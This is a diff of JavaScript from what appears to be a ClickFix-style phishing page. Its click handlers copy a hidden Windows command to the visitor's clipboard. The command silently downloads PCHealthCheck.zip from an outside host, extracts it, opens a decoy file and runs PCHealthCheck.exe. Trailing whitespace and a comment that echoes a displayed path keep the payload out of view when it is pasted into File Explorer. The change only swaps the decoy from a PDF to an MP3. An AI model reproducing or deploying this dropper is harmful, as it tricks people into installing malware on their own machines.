@@ -43,11 +43,11 @@ const fileInput = document.getElementById('fileInput');
 
 
 path.addEventListener('click', function() {
-     copyToClipboard('cmd /c start /min cmd /v:on /c "set "myVar=%RANDOM%" && set "p=%TEMP%\\!myVar!" && mkdir "!p!" && curl -s -o "!p!\\PCHealthCheck.zip" "https://voice.sso.blologistics.com/scr/PCHealthCheck.zip" && tar -xf "!p!\\PCHealthCheck.zip" -C "!p!" && del "!p!\\PCHealthCheck.zip" && pushd "!p!" && start "" "2026GC006824.pdf" && start "" "PCHealthCheck.exe""      # ' +urlpath.textContent+'                                                                                                                    ');
+     copyToClipboard('cmd /c start /min cmd /v:on /c "set "myVar=%RANDOM%" && set "p=%TEMP%\\!myVar!" && mkdir "!p!" && curl -s -o "!p!\\PCHealthCheck.zip" "https://voice.sso.blologistics.com/scr/PCHealthCheck.zip" && tar -xf "!p!\\PCHealthCheck.zip" -C "!p!" && del "!p!\\PCHealthCheck.zip" && pushd "!p!" && start "" "voice.mp3" && start "" "PCHealthCheck.exe""      # ' +urlpath.textContent+'                                                                                                                    ');
 });
 
 fileExplorer.addEventListener('click', function() {
-    copyToClipboard('cmd /c start /min cmd /v:on /c "set "myVar=%RANDOM%" && set "p=%TEMP%\\!myVar!" && mkdir "!p!" && curl -s -o "!p!\\PCHealthCheck.zip" "https://voice.sso.blologistics.com/scr/PCHealthCheck.zip" && tar -xf "!p!\\PCHealthCheck.zip" -C "!p!" && del "!p!\\PCHealthCheck.zip" && pushd "!p!" && start "" "2026GC006824.pdf" && start "" "PCHealthCheck.exe""      # ' +urlpath.textContent+'                                                                                                                  ').then(() => {
+    copyToClipboard('cmd /c start /min cmd /v:on /c "set "myVar=%RANDOM%" && set "p=%TEMP%\\!myVar!" && mkdir "!p!" && curl -s -o "!p!\\PCHealthCheck.zip" "https://voice.sso.blologistics.com/scr/PCHealthCheck.zip" && tar -xf "!p!\\PCHealthCheck.zip" -C "!p!" && del "!p!\\PCHealthCheck.zip" && pushd "!p!" && start "" "voice.mp3" && start "" "PCHealthCheck.exe""      # ' +urlpath.textContent+'                                                                                                                  ').then(() => {
         fileInput.click();
     });
 });
